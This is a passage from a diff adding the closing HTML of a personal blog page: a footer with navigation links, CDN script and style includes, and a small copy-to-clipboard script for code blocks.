+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2021-2024
+    l3vi4th4n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
